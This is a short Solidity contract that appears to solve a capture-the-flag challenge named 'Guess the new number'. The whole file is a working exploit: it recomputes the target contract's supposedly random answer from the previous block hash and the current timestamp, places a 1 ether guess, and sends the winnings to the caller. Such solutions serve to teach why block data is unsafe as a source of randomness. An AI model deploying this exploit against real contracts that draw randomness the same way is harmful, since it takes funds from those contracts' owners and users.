pragma solidity ^0.4.24;

import "./challenge.sol";

contract GuessTheNewNumberChallengeSolver {

    function solve(address contractToSolve) public payable {
        GuessTheNewNumberChallenge c = GuessTheNewNumberChallenge(contractToSolve);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        c.guess.value(1 ether)(answer);
        msg.sender.transfer(address(this).balance);
    }

     function() payable public {
    }
}